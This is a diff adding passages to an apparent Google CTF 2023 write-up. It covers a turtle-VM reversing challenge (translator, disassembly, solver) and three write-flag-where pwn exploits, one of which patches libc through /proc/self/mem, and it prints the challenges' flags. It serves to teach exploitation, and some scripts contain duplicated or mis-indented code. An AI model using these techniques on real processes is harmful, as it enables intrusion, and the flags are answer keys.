@@ -293,7 +293,7 @@ You have been tasked with reversing the encoder file and creating a decoder as s
 
 solves: 110
 ```
-[encoder.c (From googleCTF github)](https://github.com/google/google-ctf/tree/master/2023)
+[encoder.c (From googleCTF github)](https://github.com/google/google-ctf/blob/master/2023/misc-symatrix/challenge/encoder.c)
 
 The challenge comes with a large encoder.c file, this seems intimidating initially. However, reading through the code a little bit, we quickly found out that there are part of the original python file written in the comment. Using a simple parser I extracted the python source from encoder.c file. (My parser actually missed a else: line, and I manuelly added that afterward)
 
@@ -440,7 +440,610 @@ Are we not all but turtles drifting in the sea, executing instructions as we stu
 
 solves: 27
 ```
-##todo
+
+[turt.py (From googleCTF github)](https://github.com/google/google-ctf/blob/master/2023/rev-turtle/attachments/turt.py)
+
+This is a vm implemented using turtles! After watching the program run for a bit, we can observe what each turtle are responsible for. I then write a translator (translate.py) from `c.png` "code" file to get a psuedocode (trans.txt) of the program. We notice that the program first check for the flag format, then make sure all characters are unique, make sure the characters are in a specific order, and lastly run some function on each character. It took a while to understand that the function is actually a binary search on the character value, and match each step with some value in memory. To recover the flag, I extract the reference value, take all the found characters, and order it using the reording in the memory. See `simplify.txt` for notes taken during the process, and `solve.py` for more detail.
+
+`CTF{iT5_E-tUr+1es/AlL.7h3;waY:d0Wn}`
+
+
+{% capture tutle_translate_py %}
+```python
+from Crypto.Util.number import long_to_bytes, bytes_to_long
+from sage.all import *
+from PIL import Image
+
+
+# M: Memory
+# S: Stack
+# R: Register
+def loadM(flag):
+    global M
+    M = [(ord(i), 0, 0) for i in flag] + [(0, 0, 0) for i in range(200)]
+
+def readM(a):
+    return f"M[{a}]"
+
+def writeM(a, c):
+    print(f"M[{a}] = {c}")
+
+
+sp = 0
+def loadS():
+    global S
+    S = [(255, 128, 128) for i in range(240)]
+    sp = 120
+
+def readS(a):
+    return f"S[sp+{a}]"
+
+def writeS(a, c):
+    print(f"S[sp+{a}] = {c}")
+
+def loadR():
+    global R
+    R = [(0, 0, 0) for i in range(9)]
+
+def readR(a):
+    return f"R[{a}]"
+
+def writeR(a, c):
+    print(f"R[{a}] = {c}")
+
+def readRVal(rNum):
+  return readC(readR(rNum))
+
+def getRNum(colorOrInt):
+  if type(colorOrInt) == tuple:
+    colorOrInt = colorOrInt[0]
+  return (colorOrInt-20) // 40
+
+def read(op, isR, isP, isC):
+  if isP:
+    return readPVal(op, isR, isC)
+  elif isR:
+    return readRVal(getRNum(op))
+  elif isC:
+    return readC(op)
+  raise BaseException("invalid insn")
+
+def write(op, val, isR, isP, isC):
+  if isP:
+    writePVal(op, val, isR, isC)
+  elif isR:
+    writeRVal(getRNum(op), val)
+  else:
+    raise BaseException("invalid insn")
+
+def writeRVal(rNum, val):
+  writeR(rNum, cToColor(val))
+
+def writePVal(op, val, isS, isC):
+  a = readPA(op, isC)
+  if isS:
+    writeS(a, cToColor(val))
+  else:
+    writeM(a, cToColor(val))
+
+def readPVal(op, isS, isC):
+    a = readPA(op, isC)
+    if isS:
+        return readC(readS(a))
+    else:
+        return readC(readM(a))
+
+def readPA(op, isC):
+  if isC:
+    return readC(op)
+  a = ""
+  if op[0] != 0:
+    a = readRVal(getRNum(op[0])) + " + "
+  if op[1] != 0:
+    a += readRVal(getRNum(op[1])) + " + "
+  a += readOneByteC(op[2])
+  return a
+
+def readC(op):
+  if type(op) == str:
+      return op
+  c = op[0] + (op[1]<<8) + (op[2]<<16)
+  if c >= (256**3)//2:
+    c = -((256**3)-c)
+  return str(c)
+
+def readOneByteC(val):
+  if val > 256//2:
+    return str(-(256-val))
+  return str(val)
+
+def cToColor(val):
+  return f"{val}"
+  if val < 0:
+    val = 256**3 + val
+  return [val%256, (val>>8)%256, (val>>16)%256]
+
+im = Image.open("c.png").convert("RGB")
+w, h = im.size
+#print(w, h)
+px = im.load()
+C = [[px[i, j] for i in range(3)] for j in range(h)]
+C+= [[px[i, j] for i in range(3, 6)] for j in range(h)]
+C+= [[px[i, j] for i in range(6, 9)] for j in range(h)]
+#print(C)
+
+im = Image.open("m.png").convert("RGB")
+w, h = im.size
+#print(w, h)
+px = im.load()
+M = [px[j, i] for i in range(h) for j in range(w)]
+print([i[0] for i in M[65:95]])
+print([i[0] for i in M[95:]])
+
+
+#print(C)
+
+ip = 0
+def run():
+    global sp
+    for ip in range(h*3):
+        print(f"<{ip:04d}>: ", end="")
+        color0 = C[ip][0]
+        cmpcolor = (color0[0]&0xfc, color0[1]&0xfc, color0[2]&0xfc)
+        color1 = C[ip][1]
+        color2 = C[ip][2]
+
+        isR1 = color0[0]&1 != 0
+        isP1 = color0[1]&1 != 0
+        isC1 = color0[2]&1 != 0
+        isR2 = color0[0]&2 != 0
+        isP2 = color0[1]&2 != 0
+
+ip = 0
+def run():
+    global sp
+    for ip in range(h*3):
+        print(f"<{ip:04d}>: ", end="")
+        color0 = C[ip][0]
+        cmpcolor = (color0[0]&0xfc, color0[1]&0xfc, color0[2]&0xfc)
+        color1 = C[ip][1]
+        color2 = C[ip][2]
+
+        isR1 = color0[0]&1 != 0
+        isP1 = color0[1]&1 != 0
+        isC1 = color0[2]&1 != 0
+        isR2 = color0[0]&2 != 0
+        isP2 = color0[1]&2 != 0
+        isC2 = color0[2]&2 != 0
+
+        if cmpcolor == (0,252,0):
+            print("print('correct flag!')")
+        elif cmpcolor == (252,0,0):
+            print("print('wrong flag :C')")
+        elif cmpcolor == (204, 204, 252):
+            print(f"sp += {readC(color1)}")
+        elif cmpcolor == (220, 252, 0) or cmpcolor == (252, 188, 0) or cmpcolor == (64, 224, 208) or cmpcolor == (156, 224, 188) or cmpcolor == (100, 148, 236) or cmpcolor == (252, 124, 80):
+            if cmpcolor == (252, 188, 0):
+                val2 = readPA(color2, isC2)
+            else:
+                val2 = read(color2, isR2, isP2, isC2)
+
+            if cmpcolor == (220, 252, 0) or cmpcolor == (252, 188, 0):
+                write(color1, val2, isR1, isP1, isC1)
+            elif cmpcolor == (64, 224, 208):
+                val1 = read(color1, isR1, isP1, isC1)
+                write(color1, val1+" + "+val2, isR1, isP1, isC1)
+            elif cmpcolor == (156, 224, 188):
+                val1 = read(color1, isR1, isP1, isC1)
+                write(color1, val1+" - "+val2, isR1, isP1, isC1)
+            elif cmpcolor == (100, 148, 236):
+                val1 = read(color1, isR1, isP1, isC1)
+                write(color1, val1+">>"+val2, isR1, isP1, isC1)
+            elif cmpcolor == (252, 124, 80):
+                val1 = read(color1, isR1, isP1, isC1)
+                print(f"cmp {val1} {val2}")
+#                writeRVal(6, 16581630 if (val1 == val2) else 0)
+#                writeRVal(7, 16581630 if (val1 < val2) else 0)
+#                writeRVal(8, 16581630 if (val1 > val2) else 0)
+        elif cmpcolor == (220, 48, 96):
+#            e = readRVal(6)
+#            l = readRVal(7)
+#            g = readRVal(8)
+            op = "j"
+            if color0[0]&2 != 0:
+                op+= "l"
+            if color0[1]&2 != 0:
+                op+= "g"
+            if color0[0]&1 != 0:
+                op+= "e"
+            if color0[1]&1 != 0:
+                op+= "ne"
+
+            if op == "jlgene":
+                op = "jmp"
+
+            dest = f"{op} {ip}+{readC(color1)}-1"
+            offset = f"{ip} + {readC(color1)}-1"
+            try:
+                offset_num = eval(offset)
+                print(f"{op} <{offset_num:04d}>")
+            except:
+                print(dest)
+
+        elif cmpcolor == (252, 0, 252):
+            jmp = ((color1[0])//3)*h - color1[1] - 1
+            print(f"call <{ip+jmp:04d}>")
+#            writeS(0, (color1[0], color1[1], 127))
+        elif cmpcolor == (128, 0, 128):
+            print("ret")
+        else:
+            print()
+
+run()
+```
+{% endcapture %}
+
+{% include widgets/toggle-field.html toggle-name="tutle_translate_py"
+    button-text="Show translate.py" toggle-text=tutle_translate_py %}
+		
+		
+{% capture turtle_trans_txt %}
+```txt
+<0000>: sp += -83
+<0001>: R[2] = M[0]
+<0002>: cmp R[2] 67
+<0003>: jne <0015>
+<0004>: R[2] = M[1]
+<0005>: cmp R[2] 84
+<0006>: jne <0015>
+<0007>: R[2] = M[2]
+<0008>: cmp R[2] 70
+<0009>: jne <0015>
+<0010>: R[2] = M[3]
+<0011>: cmp R[2] 123
+<0012>: jne <0015>
+<0013>: R[2] = M[34]
+<0014>: cmp R[2] 125
+<0015>: je <0016>
+<0016>: print('wrong flag :C')
+<0017>: S[sp+1] = 0
+<0018>: cmp S[sp+1] 79
+<0019>: jg <0023>
+<0020>: R[2] = S[sp+1]
+<0021>: S[sp+R[2] + 3] = 0
+<0022>: S[sp+1] = S[sp+1] + 1
+<0023>: jmp <0017>
+<0024>: S[sp+2] = 4
+<0025>: R[2] = S[sp+2]
+<0026>: cmp R[2] 28
+<0027>: jg <0053>
+<0028>: R[2] = S[sp+2]
+<0029>: R[5] = 0
+<0030>: R[2] = M[R[2] + R[5] + 0]
+<0031>: cmp R[2] 42
+<0032>: jle <0037>
+<0033>: R[2] = S[sp+2]
+<0034>: R[5] = 0
+<0035>: R[2] = M[R[2] + R[5] + 0]
+<0036>: cmp R[2] 122
+<0037>: jle <0038>
+<0038>: print('wrong flag :C')
+<0039>: R[2] = S[sp+2]
+<0040>: R[5] = 0
+<0041>: R[2] = M[R[2] + R[5] + 0]
+<0042>: R[2] = R[2] - 43
+<0043>: R[2] = S[sp+R[2] + 3]
+<0044>: cmp R[2] 65535
+<0045>: jne <0046>
+<0046>: print('wrong flag :C')
+<0047>: R[2] = S[sp+2]
+<0048>: R[5] = 0
+<0049>: R[2] = M[R[2] + R[5] + 0]
+<0050>: R[2] = R[2] - 43
+<0051>: S[sp+R[2] + 3] = 65535
+<0052>: S[sp+2] = S[sp+2] + 1
+<0053>: jmp <0024>
+<0054>: call <0082>
+<0055>: M[519] = 0
+<0056>: S[sp+0] = 43
+<0057>: cmp S[sp+0] 122
+<0058>: jg <0067>
+<0059>: R[2] = S[sp+0]
+<0060>: R[5] = 30
+<0061>: R[0] = 35
+<0062>: R[1] = R[2]
+<0063>: call <0165>
+<0064>: R[2] = S[sp+0]
+<0065>: R[2] = R[2] + 1
+<0066>: S[sp+0] = R[2]
+<0067>: jmp <0056>
+<0068>: print('correct flag!')
+<0069>:
+<0070>:
+<0071>:
+<0072>:
+<0073>:
+<0074>:
+<0075>:
+<0076>:
+<0077>:
+<0078>:
+<0079>:
+<0080>:
+<0081>:
+<0082>:
+<0083>: R[2] = 4
+<0084>: S[sp+-2] = R[2]
+<0085>: S[sp+-3] = 0
+<0086>: R[2] = S[sp+-3]
+<0087>: cmp R[2] 29
+<0088>: jg <0100>
+<0089>: R[2] = S[sp+-3]
+<0090>: R[5] = R[2]
+<0091>: R[2] = S[sp+-2]
+<0092>: R[5] = R[5] + R[2]
+<0093>: R[2] = S[sp+-3]
+<0094>: R[4] = 65
+<0095>: R[2] = M[R[2] + R[4] + 0]
+<0096>: R[5] = M[R[5] + 0]
+<0097>: R[4] = 35
+<0098>: M[R[2] + R[4] + 0] = R[5]
+<0099>: S[sp+-3] = S[sp+-3] + 1
+<0100>: jmp <0085>
+<0101>: ret
+<0102>:
+<0103>:
+<0104>:
+<0105>:
+<0106>:
+<0107>:
+<0108>:
+<0109>:
+<0110>:
+<0111>:
+<0112>:
+<0113>:
+<0114>:
+<0115>:
+<0116>:
+<0117>:
+<0118>:
+<0119>:
+<0120>:
+<0121>:
+<0122>:
+<0123>:
+<0124>:
+<0125>:
+<0126>:
+<0127>:
+<0128>:
+<0129>:
+<0130>:
+<0131>:
+<0132>:
+<0133>:
+<0134>:
+<0135>:
+<0136>:
+<0137>:
+<0138>:
+<0139>:
+<0140>:
+<0141>:
+<0142>:
+<0143>:
+<0144>:
+<0145>:
+<0146>:
+<0147>:
+<0148>:
+<0149>:
+<0150>:
+<0151>:
+<0152>:
+<0153>:
+<0154>:
+<0155>:
+<0156>:
+<0157>:
+<0158>:
+<0159>:
+<0160>:
+<0161>:
+<0162>:
+<0163>:
+<0164>:
+<0165>:
+<0166>: sp += -4
+<0167>: R[4] = R[1]
+<0168>: S[sp+0] = R[0]
+<0169>: R[2] = R[5]
+<0170>: R[5] = R[4]
+<0171>: S[sp+2] = R[5]
+<0172>: S[sp+1] = R[2]
+<0173>: R[2] = M[519]
+<0174>: cmp R[2] 424
+<0175>: jne <0176>
+<0176>: print('wrong flag :C')
+<0177>: cmp S[sp+1] 0
+<0178>: jne <0186>
+<0179>: R[2] = M[519]
+<0180>: R[5] = R[2] + 1
+<0181>: M[519] = R[5]
+<0182>: R[5] = 95
+<0183>: R[2] = M[R[2] + R[5] + 0]
+<0184>: cmp R[2] 4
+<0185>: je <0246>
+<0186>: print('wrong flag :C')
+<0187>: R[2] = S[sp+1]
+<0188>: R[2] = R[2] - 1
+<0189>: R[2] = R[2]>>1
+<0190>: S[sp+3] = R[2]
+<0191>: R[5] = S[sp+3]
+<0192>: R[2] = S[sp+0]
+<0193>: R[2] = R[2] + R[5]
+<0194>: R[2] = M[R[2] + 0]
+<0195>: cmp S[sp+2] R[2]
+<0196>: jge <0211>
+<0197>: R[2] = M[519]
+<0198>: R[5] = R[2] + 1
+<0199>: M[519] = R[5]
+<0200>: R[5] = 95
+<0201>: R[2] = M[R[2] + R[5] + 0]
+<0202>: cmp R[2] 1
+<0203>: je <0204>
+<0204>: print('wrong flag :C')
+<0205>: R[5] = S[sp+3]
+<0206>: R[2] = S[sp+2]
+<0207>: R[4] = S[sp+0]
+<0208>: R[0] = R[4]
+<0209>: R[1] = R[2]
+<0210>: call <0165>
+<0211>: jmp <0246>
+<0212>: R[5] = S[sp+3]
+<0213>: R[2] = S[sp+0]
+<0214>: R[2] = R[2] + R[5]
+<0215>: R[2] = M[R[2] + 0]
+<0216>: cmp S[sp+2] R[2]
+<0217>: jle <0238>
+<0218>: R[2] = M[519]
+<0219>: R[5] = R[2] + 1
+<0220>: M[519] = R[5]
+<0221>: R[5] = 95
+<0222>: R[2] = M[R[2] + R[5] + 0]
+<0223>: cmp R[2] 2
+<0224>: je <0225>
+<0225>: print('wrong flag :C')
+<0226>: R[2] = S[sp+1]
+<0227>: R[2] = R[2] - S[sp+3]
+<0228>: R[2] = R[2] - 1
+<0229>: R[5] = R[2]
+<0230>: R[2] = S[sp+3]
+<0231>: R[4] = R[2] + 1
+<0232>: R[2] = S[sp+0]
+<0233>: R[4] = R[4] + R[2]
+<0234>: R[2] = S[sp+2]
+<0235>: R[0] = R[4]
+<0236>: R[1] = R[2]
+<0237>: call <0165>
+<0238>: jmp <0246>
+<0239>: R[2] = M[519]
+<0240>: R[5] = R[2] + 1
+<0241>: M[519] = R[5]
+<0242>: R[5] = 95
+<0243>: R[2] = M[R[2] + R[5] + 0]
+<0244>: cmp R[2] 3
+<0245>: je <0246>
+<0246>: print('wrong flag :C')
+<0247>: sp += 4
+<0248>: ret
+```
+{% endcapture %}
+
+{% include widgets/toggle-field.html toggle-name="turtle_trans_txt"
+    button-text="Show trans.txt" toggle-text=turtle_trans_txt %}
+		
+{% capture turtle_simplify_py %}
+```python
+M[0] = 67
+M[1] = 84
+M[2] = 70
+M[3] = 123
+M[4] = 125
+for i in range(80):
+        S[sp+i+3] = 0
+
+len = 80
+
+for j in range(4, 29):
+        #M[j] in {42, 122}
+        #all letter in this set is unique
+
+for j in range(29):
+        res = [0 for i in range(30)]
+        shuffle = [23, 14, 7, 18, 12, 1, 28, 15, 26, 0, 5, 21, 27, 3, 11, 24, 13, 2, 8, 22, 6, 10, 29, 19, 17, 9, 20, 4, 16, 25]
+        res[shuffle[j]] = M[j+4]
+
+t = 0
+def check(a, b, c):
+        if t==424:
+                print('wrong flag :target')
+        if len == 0:
+                R[2] = M[t + 95]
+                t = t + 1
+                if R[2] == 4:
+                        return
+                else:
+                        print('wrong flag :target')
+
+        mid_len = (len-1)//2
+        mid_point = st + mid_len
+        if target < M[mid_point]:
+                R[2] = M[t + 95]
+                t = t + 1
+                if R[2] == 1:
+                        return
+                else:
+                        print('wrong flag :target')
+
+                check(st, target, mid_len)
+
+        elif target > M[mid_point]:
+                R[2] = M[t + 95]
+                t = t + 1
+                if R[2] == 2:
+                        return
+                else:
+                        print('wrong flag :target')
+
+                check(st+mid_len+1, target, len - mid_len - 1)
+
+        else:
+                R[2] = M[t + 95]
+                t = t + 1
+                if R[2] == 3:
+                        return
+                else:
+                        print('wrong flag :target')
+        return
+
+
+for i in range(43, 122):
+        check(35, i, 30) #R0, R1, R5
+```
+{% endcapture %}
+
+{% include widgets/toggle-field.html toggle-name="turtle_simplify_py"
+    button-text="Show simplify.txt" toggle-text=turtle_simplify_py%}
+
+{% capture turtle_solve_py %}
+```python
+from PIL import Image
+
+im = Image.open("m.png").convert("RGB")
+w, h = im.size
+#print(w, h)
+px = im.load()
+M = [px[j, i] for i in range(h) for j in range(w)]
+ordering = [i[0] for i in M[65:95]]
+finding = [i[0] for i in M[95:95+424]]
+
+chars = [i for i in range(43, 123)]
+finding = [4-i for i in finding if i in [3, 4]]
+
+flag = ""
+for i in range(len(chars)):
+    if finding[i] == 1:
+        flag+=chr(chars[i])
+
+flag = "".join([flag[i] for i in ordering])
+print(f"CTF{{{flag}}}")
+```
+{% endcapture %}
+
+{% include widgets/toggle-field.html toggle-name="turtle_solve_py"
+    button-text="Show solve.py" toggle-text=turtle_solve_py%}
 
 ---
 # Crypto
@@ -725,3 +1328,301 @@ nc wfw[123].2023.ctfcompetition.com 1337
 solves 294 / 155 / 43
 ```
 From reversing the challenge, we can quickly identify the behavior. The challenge first output the process map, allowing us to know pie, libc, and stack addresses. It then close stdin/stdout/stderr, and only accept inputs from fd 1337. Lastly, the challenge goes into a while loop, taking an address and a count, then write count number of bytes of flag to the specified address. Note that the flag is written by writting directly to the process memory file, so all addresses are writable, **including the code themselves**. This will be handy for part 3.
+
+The decompiled code from ghidra for part 3, with some modification to reflect each level:
+{% capture wfw_chal_c %}
+```c
+int main(){
+  local_c = open("/proc/self/maps",0);
+  read(local_c,maps,0x1000);
+  close(local_c);
+  local_10 = open("./flag.txt",0);
+  if (local_10 == -1) {
+    puts("flag.txt not found");
+  }
+  else {
+    sVar2 = read(local_10,flag,0x80);
+    if (0 < sVar2) {
+      close(local_10);
+      local_14 = dup2(1,0x539);
+      local_18 = open("/dev/null",2);
+      dup2(local_18,0);
+      dup2(local_18,1);
+      dup2(local_18,2);
+      close(local_18);
+      alarm(0x3c);
+      dprintf(local_14,
+              "Your skills are considerable, I\'m sure you\'ll agree\nBut this final level\'s toughn ess fills me with glee\nNo writes to my binary, this I require\nFor otherwise I will s urely expire\n"
+             );
+      dprintf(local_14,"%s\n\n",maps);
+      while( true ) {
+	// dprintf(local_14,"Give me an address and a length just so:\n<address> <length>\nAnd I\'ll write it wh erever you want it to go.\nIf an exit is all that you desire\nSend me nothing and I  will happily expire\n"); // part 1
+        local_78 = 0;
+        local_70 = 0;
+        local_68 = 0;
+        local_60 = 0;
+        local_58 = 0;
+        local_50 = 0;
+        local_48 = 0;
+        local_40 = 0;
+        sVar2 = read(local_14,&local_78,0x40);
+        local_1c = (undefined4)sVar2;
+        iVar1 = __isoc99_sscanf(&local_78,"0x%llx %u",&local_28,&local_2c);
+	// if (((iVar1 != 2) || (0x7f < local_2c))) // part 2
+        if (((iVar1 != 2) || (0x7f < local_2c)) || ((main - 0x5000 < local_28 && (local_28 < main + 0x5000)))) // part 3
+        break;
+        local_20 = open("/proc/self/mem",2);
+        lseek64(local_20,local_28,0);
+        write(local_20,flag,(ulong)local_2c);
+        close(local_20);
+      }
+                    /* WARNING: Subroutine does not return */
+      exit(0);
+    }
+    puts("flag.txt empty");
+  }
+  return 1;
+}
+```
+{% endcapture %}
+
+{% include widgets/toggle-field.html toggle-name="wfw_chal_c"
+    button-text="Show chal.c" toggle-text=wfw_chal_c %}
+
+For part 1, there is a dprintf function call after the entrence to the while loop, so writing the flag to the string that are printed each loop can leak the flag. 
+
+`CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9}`
+
+{% capture wfw_solve_py %}
+```python
+from pwn import *
+
+elf = ELF("./chal_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.35.so")
+
+context.binary = elf
+context.terminal = ["tmux", "splitw", "-h"]
+
+def connect():
+        nc_str = "nc wfw1.2023.ctfcompetition.com 1337"
+        _, host, port = nc_str.split(" ")
+        p = remote(host, int(port))
+
+    return p
+
+def main():
+    p = connect()
+    p.recvuntil(b"shot.\n")
+    s = p.recvline()
+    elf.address = int(s.split(b'-')[0], 16)
+    print(hex(elf.address))
+
+    p.sendline(f"{hex(elf.address + 0x21e0)} 60")
+
+    p.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+{% endcapture %}
+
+{% include widgets/toggle-field.html toggle-name="wfw_solve_py"
+    button-text="Show solve.py" toggle-text=wfw_solve_py %}
+
+Part 2 proves to be trickier. In ghidra, the exit call stopped the decompiler from disassembling the code further, therefore missing a dprintf function call after the `exit(0)` call. Instead, I tried to leak the flag using the sscanf function with the string `0x%llx %u`. 
+The sscanf function call will attempt to match the input format string from the input string. In the original challenge, it's trying to match the starting 0x before reading the hex numbers as input. For example, if we overwrite the format string to `Cx%llx %u` and send the input `Cx0 0`, the program will continue normally, but input `Dx0 0` will exit immediately after. Therefore, we can overwrite that string, then attempt to read different strings, leaking the flag byte by byte. See `solve2.py` for implementation details.
+
+`CTF{impr355iv3_6ut_can_y0u_s01v3_cha113ng3_3?}`
+
+{% capture wfw_solve2_py %}
+```python
+#!/usr/bin/python3
+from pwn import *
+elf = ELF("./chal_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.35.so")
+
+context.binary = elf
+context.terminal = ["tmux", "splitw", "-h"]
+
+def connect():
+        nc_str = "nc wfw2.2023.ctfcompetition.com 1337"
+        _, host, port = nc_str.split(" ")
+        p = remote(host, int(port))
+
+    return p
+
+def attempt(cur_flag, ch):
+    p = connect()
+    p.recvuntil(b"fluff\n")
+    elf.address = int(p.recvline().split(b'-')[0], 16)
+
+    for i in range(6):
+        p.recvline()
+
+    libc.address = int(p.recvline().split(b'-')[0], 16)
+
+    for i in range(11):
+        p.recvline()
+
+    stack_base = int(p.recvline().split(b'-')[0], 16)
+
+    for i in range(5):
+        p.recvline()
+
+#    print(hex(elf.address), hex(libc.address), hex(stack_base))
+    count = len(cur_flag)+1
+    target_address = elf.address+0x20bc-(count-1)
+    overwrite_str = hex(target_address)
+    p.sendline(f"{overwrite_str} {count}")
+
+    overwrite_str = hex(target_address)
+    p.sendline(f"{ch}{overwrite_str[1:]} {count}")
+
+    overwrite_str = hex(target_address)
+    p.sendline(f"-{overwrite_str[1:]} {count}")
+
+    try:
+        p.recv(1, timeout=1)
+    except Exception:
+        p.close()
+        return False
+    p.close()
+    return True
+
+def main():
+    context.log_level='critical'
+    FLAG = "CTF{"
+    for l in range(100):
+        for c in "_"+string.printable[:-7]:
+            print(FLAG+c)
+            if attempt(FLAG, c):
+                FLAG+=c
+                break
+        if FLAG[-1] == "}":
+            break
+    print(FLAG)
+
+
+if __name__ == "__main__":
+    main()
+```
+{% endcapture %}
+
+{% include widgets/toggle-field.html toggle-name="wfw_solve2_py"
+    button-text="Show solve2.py" toggle-text=wfw_solve2_py  %}
+	
+
+Lastly for part 3, we can't write into the main binary region, including the all the data sections. After looking through the functions in libc that are used, I found that the read function is the most likely function to be hijacked, since the arguments used to call the function is helpful. 
+
+Meanwhile, I also look for some useful instructions we can create using the flag prefix. I notice that 0x43 ('C') is a prefix in x86 assembly, and can be used to nop out instruction with minimal effects on most registers. Another interesting instruction is 0x7b ('{'), which is jnp. This allow use to jmp further down the program. The changes made to the read function is as follow: (Assembly of the unmodified/modified assembly will be added below) 
+1. Overwrite the second syscall to set rsi from rsp+0x43
+2. Overwrite ja after second syscall to jnp to jump downward
+3. Overwrite jump direction of the last jmp to jump to write function
+4. Overwrite broken instructions with nop so it doesn't segfault
+5. Overwrite the first return in the read function to trigger the full exploit.
+
+After overwriting the first return, I control the input to the read syscall to manipulate the content in rsp+0x43, and write the flag location there, so the write syscall will leak out the flag. To overcome the issue of no output, I add a sleep between each input to make sure the remove server have enough time to process each input. A better solution will be to pad each input to 0x40 bytes, then no delay will be needed. The solve script is in solve3.py. 
+
+`CTF{y0ur_3xpl0itati0n_p0w3r_1s_0v3r_9000!!}`
+{% capture wfw_solve3_py %}
+```python
+from pwn import *
+import time
+
+elf = ELF("./chal_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.35.so")
+
+context.binary = elf
+context.terminal = ["tmux", "splitw", "-h"]
+
+
+def connect():
+    if args.REMOTE:
+        nc_str = "nc wfw3.2023.ctfcompetition.com 1337"
+        _, host, port = nc_str.split(" ")
+        p = remote(host, int(port))
+
+    else:
+        os.system("ulimit -n 2048")
+        p = process([elf.path], preexec_fn = lambda: os.dup2(0, 1337))
+        if args.GDB:
+           gdb_script = """
+           b *main+638
+           c 20
+           """
+           gdb.attach(p, gdb_script)
+
+    return p
+
+
+def main():
+    p = connect()
+
+    def write(addr, len):
+        #p.stdout.write(f'0x{addr:x} {len}\n'.encode())
+        p.sendline(f'0x{addr:x} {len}'.encode())
+
+        time.sleep(0.5)
+
+    libc_found = False
+    elf_found = False
+    while True:
+        line = p.recvline().decode('ascii').strip()
+        if 'chal' in line and not elf_found:
+            elf_base = int(line.split()[0].split('-')[0], 16)
+            elf_found = True
+
+        if line.endswith('libc.so.6') and not libc_found:
+            libc_base = int(line.split()[0].split('-')[0], 16)
+            libc_found = True
+
+        if line.endswith('[stack]'):
+            stack_bottom = int(line.split()[0].split('-')[1], 16)
+            break
+
+    print(hex(elf_base))
+    print(hex(libc_base))
+    print(hex(stack_bottom))
+
+    input_buf_offset = 5856
+
+    for i in range(0x1149b2, 0x1149b7):
+        write(libc_base + i, 1)
+
+    for i in range(0x114a08, 0x114a0f):
+        write(libc_base + i, 1)
+
+    write(libc_base + 0x114a60, 1)
+
+    write(libc_base + 0x1149cf, 4)
+    write(libc_base + 0x1149ce, 4)
+
+    write(libc_base + 0x114a1c, 1)
+    write(libc_base + 0x1149c0, 1)
+
+    write(libc_base + 0x11499f, 1)
+    write(libc_base + 0x11499e, 1)
+    write(libc_base + 0x11499d, 1)
+    write(libc_base + 0x11499c, 1)
+    write(libc_base + 0x11499b, 1)
+    write(libc_base + 0x11499a, 1)
+    p.send(("a"*0x13).encode()+p64(elf_base + 0x50a0))
+    time.sleep(0.5)
+    p.send(b"CT")
+
+    p.interactive()
+
+
+if __name__ == "__main__":
+    main()
+
+#CTF{y0ur_3xpl0itati0n_p0w3r_1s_0v3r_9000!!}
+```
+{% endcapture %}
+
+{% include widgets/toggle-field.html toggle-name="wfw_solve3_py"
+    button-text="Show solve3.py" toggle-text=wfw_solve3_py  %}
